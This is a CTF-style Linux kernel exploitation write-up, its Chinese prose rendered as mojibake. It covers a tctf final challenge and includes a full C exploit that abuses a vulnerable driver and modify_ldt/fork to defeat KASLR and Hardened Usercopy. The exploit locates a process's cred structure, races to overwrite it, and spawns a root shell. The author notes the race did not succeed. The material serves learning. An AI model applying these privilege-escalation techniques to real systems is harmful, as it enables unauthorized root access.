<p>ä¹ï¼Œæ•´äº†ä¸€å¤©å¤šï¼Œå°±ç®—æˆ‘æŠŠqemuçš„æ ¸å¢å¤šæœ€åçš„æ¡ä»¶ç«äº‰è¿˜æ˜¯ä¸è¡Œï¼Œè€Œä¸”æˆ‘ç¡®å®šå·²ç»å¯ä»¥æ§åˆ¶<code>ldt</code>ç»“æ„ä½“äº†ï¼Œä½†å°±æ˜¯æ¡ä»¶ç«äº‰å¤±è´¥ï¼Œå“ï¼Œè™½è¯´æ²¡æœ‰æ•´å‡ºæ¥ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†ä¸€æ‰‹éå†å†…å­˜æœç´¢<code>cred</code>ç»“æ„ä½“çš„æ–¹æ³•</p>
<p>å½“å¼€äº†<code>Hardened Usercopy</code>çš„æ—¶å€™æˆ‘ä»¬éå†æ•´ä¸ª<code>page_offset_base</code>è¿˜æ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸º<code>task_struct</code>ç»“æ„ä½“å°±åœ¨è¿™é‡Œï¼Œè€Œè¿™é‡Œæ˜¯ä¸å…è®¸å‘ç”¨æˆ·æ€æ‹·è´çš„ï¼Œä½†æ˜¯<code>tctf final</code>è¿™é“é¢˜å°±æä¾›äº†ä¸€ä¸ªéå¸¸å¥½çš„æ€è·¯ï¼Œå°±æ˜¯åˆ©ç”¨<code>fork</code>æœºåˆ¶å’Œ<code>ldt</code>ç»“æ„ä½“ç»•è¿‡<code>Hardened Usercopy</code></p>
<p>é¦–å…ˆforkä¼šæœ‰å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure>

<p>æœ€åçš„<code>ldt_dup_context()</code>å°±æ˜¯è´Ÿè´£ldtç»“æ„ä½“æ‹·è´çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªè¦æˆ‘ä»¬æ§åˆ¶äº†çˆ¶è¿›ç¨‹çš„<code>ldt-entries</code>æŒ‡é’ˆï¼Œå°±æ‹·è´ä»»æ„ä¸€æ®µå†…å­˜åˆ°å­è¿›ç¨‹çš„<code>ldt-entries</code>ä¸Šï¼Œè€Œä¸”è¿™æ˜¯å†…æ ¸å‘å†…æ ¸æ‹·è´ï¼Œä¸ä¼šè§¦å‘ä¿æŠ¤ï¼Œç„¶åæˆ‘ä»¬å†ä»å­è¿›ç¨‹ä¸­è¯»å–<code>ldt-entries</code>å°±å¯ä»¥äº†</p>
<p>æœ€åçš„è„šæœ¬</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_write</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf=cred_addr+<span class="number">4</span>;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x2000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x5000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_pid;</span><br><span class="line">    <span class="keyword">size_t</span> *comm;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    cur_pid=getpid();</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">&quot;jingyinghuaa&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid)&#123;</span><br><span class="line">            <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x4000</span>);</span><br><span class="line">            <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;modify_idf again fail\n&quot;</span>);</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            comm=(<span class="keyword">size_t</span>*)memmem(buf2,<span class="number">0x4000</span>,<span class="string">&quot;jingyinghuaa&quot;</span>,<span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="keyword">int</span>) comm[<span class="number">-58</span>]) == cur_pid))&#123;</span><br><span class="line">                     cred_addr = comm[<span class="number">-2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(cred_addr)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        addr+=<span class="number">0x4000</span>;</span><br><span class="line">        *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr:%p\n&quot;</span>,cred_addr);</span><br><span class="line">    <span class="keyword">int</span> pid_1=fork();</span><br><span class="line">    <span class="keyword">if</span>(!pid_1)&#123;</span><br><span class="line">        <span class="keyword">int</span> pid_2=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid_2)&#123;</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;buhaole\n&quot;</span>);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=cred_addr+<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// sleep(5);</span></span><br><span class="line">        chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">        chunk_free(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;begin to test\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        u_desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        u_desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        u_desc.limit = <span class="number">0</span>;</span><br><span class="line">        u_desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        u_desc.contents = <span class="number">0</span>;</span><br><span class="line">        u_desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        u_desc.lm = <span class="number">0</span>;</span><br><span class="line">        u_desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        u_desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        u_desc.useable = <span class="number">0</span>;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc, <span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">        sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;okk\n&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="è§£æ³•äºŒ-éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq-operations-ropææƒ"><a href="#è§£æ³•äºŒ-éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq-operations-ropææƒ" class="headerlink" title="è§£æ³•äºŒ éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq_operations+ropææƒ"></a>è§£æ³•äºŒ éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq_operations+ropææƒ</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ€»çš„æ¥è¯´å°±æ˜¯å…ˆåˆ©ç”¨modify_ldtçˆ†ç ´<code>page_0ffset_base</code>è¿™å—çš„çº¿æ€§åœ°å€ï¼Œè¿™æ®µè™šæ‹Ÿåœ°å€åœ¨<code>ret2dir</code>ä¸­å°±å­¦ä¹ åˆ°è¿‡ï¼Œæ˜¯ä¸€æ®µè¿ç»­çš„è™šæ‹Ÿåœ°å€ï¼Œä¸€å…±æœ‰64TB,æ˜ å°„äº†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œ<code>kmalloc</code>çš„å†…å­˜ç”³è¯·å°±æ˜¯åœ¨è¿™é‡Œè¿›è¡Œçš„ï¼Œåœ¨ä¸å¼€kaslrçš„æ—¶å€™ï¼Œ<code>page_offset_base=0xffff888000000000</code>,ä½†æ˜¯æœ¬é¢˜å¼€äº†ï¼Œæ‰€ä»¥éœ€è¦çˆ†ç ´è¿™ä¸ªçš„åœ°å€ï¼Œçˆ†ç ´å°±æ˜¯åˆ©ç”¨<code>read_ldt</code>æ¥çˆ†ç ´ï¼Œ</p>
<p>ä»£ç å¦‚ä¸‹,å°±æ˜¯åœ¨<code>0xffff888000000000</code>çš„åŸºç¡€ä¸Šæ¯æ¬¡åŠ <code>0x40000000</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦åŠ <code>0x40000000</code>,æˆ‘çŒœæµ‹æ˜¯<code>page_offset_base</code>ä¹Ÿæ˜¯æŒ‡å®šçš„å‡ ä½éšæœºåŒ–ï¼Œå’Œä»£ç æ®µä¸€æ ·ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">   *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆä¸ç›´æ¥çˆ†ç ´kernelçš„ä»£ç æ®µï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°äº†å†…æ ¸ä¼šç›´æ¥æŠ¥é”™é€€å‡ºï¼Œè‡³äºåŸå› ï¼Œåº”è¯¥æ˜¯å†…æ ¸å¼€å¯äº† <code>Hardened Usercopy</code>ä¿æŠ¤ï¼Œå¼€å¯è¿™ä¸ªä¿æŠ¤åï¼Œåœ¨å‘å†…æ ¸æ‹·è´æ•°æ®æˆ–è€…ä»å†…æ ¸ä¸­æ‹·è´æ•°æ®çš„æ—¶å€™å°±ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥è¿™æ®µå†…æ ¸å†…å­˜æ˜¯å¦åœ¨å †æ ˆä¸­ï¼Œæ˜¯å¦æ˜¯objectï¼Œæ˜¯å¦éå†…æ ¸æˆ–è€…ä»£ç æ®µï¼ŒæŒ‰æˆ‘çš„ç†è§£ï¼Œç®€è€Œè¨€ä¹‹ï¼Œæœ‰äº›å†…å­˜å¯ä»¥æ‹·è´ï¼Œæ¯”å¦‚å †æ ˆï¼Œæœ‰äº›å°±ä¸è¡Œï¼Œæ¯”å¦‚ä»£ç æ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">   <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;num:%d\n&quot;</span>,i);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           vmlinux_nokaslr_addr+=<span class="number">0x100000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">           i++;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,vmlinux_nokaslr_addr);</span><br></pre></td></tr></table></figure>

